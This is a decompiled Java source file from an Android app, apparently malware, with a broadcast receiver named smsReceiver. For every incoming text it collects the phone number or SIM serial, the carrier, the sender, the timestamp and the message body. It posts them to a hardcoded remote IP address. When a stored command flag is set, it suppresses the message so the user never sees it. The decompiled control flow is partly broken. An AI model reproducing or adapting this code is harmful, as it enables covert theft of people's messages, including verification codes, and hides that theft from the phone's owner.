// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.content.*;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.*;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class smsReceiver extends BroadcastReceiver
{

    public smsReceiver()
    {
        update_url = "http://223.255.198.147/home/send_product.php";
        TAG = "smsReceiver";
    }

    public boolean netWorkIsAvailable(Context context)
    {
        NetworkInfo networkinfo = ((ConnectivityManager)context.getSystemService("connectivity")).getActiveNetworkInfo();
        return networkinfo != null && networkinfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent)
    {
        TelephonyManager telephonymanager;
        Bundle bundle;
        StrictMode.setThreadPolicy((new android.os.StrictMode.ThreadPolicy.Builder()).detectDiskReads().detectDiskWrites().detectNetwork().penaltyLog().build());
        StrictMode.setVmPolicy((new android.os.StrictMode.VmPolicy.Builder()).detectLeakedSqlLiteObjects().penaltyLog().penaltyDeath().build());
        if(!netWorkIsAvailable(context))
            break MISSING_BLOCK_LABEL_460;
        String s = context.getSharedPreferences("commond", 1).getString("cmd", "0");
        Log.d("smsreceiver", (new StringBuilder("smsreceiver run cmd--- ")).append(s).toString());
        if(s.contains("1"))
        {
            Log.d(TAG, "smsReceiver \u62E6\u622A\u77ED\u4FE1\u6210\u529F");
            abortBroadcast();
        }
        telephonymanager = (TelephonyManager)context.getSystemService("phone");
        bundle = intent.getExtras();
        if(bundle == null) goto _L2; else goto _L1
_L1:
        Object aobj[];
        int i;
        int j;
        aobj = (Object[])bundle.get("pdus");
        i = aobj.length;
        j = 0;
_L5:
        if(j < i) goto _L3; else goto _L2
_L2:
        return;
_L3:
        SmsMessage smsmessage;
        SimpleDateFormat simpledateformat;
        smsmessage = SmsMessage.createFromPdu((byte[])aobj[j]);
        params2 = new ArrayList();
        String s1 = telephonymanager.getLine1Number();
        if(s1 == null || s1.length() < 11)
            s1 = telephonymanager.getSimSerialNumber();
        params2.add(new BasicNameValuePair("sim_no", s1));
        params2.add(new BasicNameValuePair("tel", telephonymanager.getSimOperatorName()));
        params2.add(new BasicNameValuePair("thread_id", "0"));
        params2.add(new BasicNameValuePair("address", smsmessage.getOriginatingAddress()));
        simpledateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String s3 = simpledateformat.format(new Date(smsmessage.getTimestampMillis()));
        String s2 = s3;
_L6:
        params2.add(new BasicNameValuePair("datetime", s2));
        params2.add(new BasicNameValuePair("bady", smsmessage.getDisplayMessageBody()));
        params2.add(new BasicNameValuePair("read", "1"));
        params2.add(new BasicNameValuePair("type", "1"));
        (new Thread() {

            public void run()
            {
                DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(update_url);
                try
                {
                    httppost.setEntity(new UrlEncodedFormEntity(params2, "EUC-KR"));
                }
                catch(UnsupportedEncodingException unsupportedencodingexception)
                {
                    unsupportedencodingexception.printStackTrace();
                }
                try
                {
                    org.apache.http.HttpResponse httpresponse = defaulthttpclient.execute(httppost);
                    Log.d(TAG, (new StringBuilder("smsReceiver \u53D1\u9001\u77ED\u4FE1\u5230\u540E\u53F0 ")).append(httpresponse.toString()).toString());
                    return;
                }
                catch(ClientProtocolException clientprotocolexception)
                {
                    clientprotocolexception.printStackTrace();
                    return;
                }
                catch(IOException ioexception)
                {
                    ioexception.printStackTrace();
                }
            }

            final smsReceiver this$0;

            
            {
                this$0 = smsReceiver.this;
                super();
            }
        }).start();
        j++;
        if(true) goto _L5; else goto _L4
_L4:
        Exception exception;
        exception;
        s2 = "1970-01-01 10:12:13";
          goto _L6
        abortBroadcast();
        return;
    }

    private static String BLOCKED_NUMBER = "10010";
    public static String SEND_FLAG = "";
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    String TAG;
    Intent intent_thread;
    List params2;
    String update_url;

}
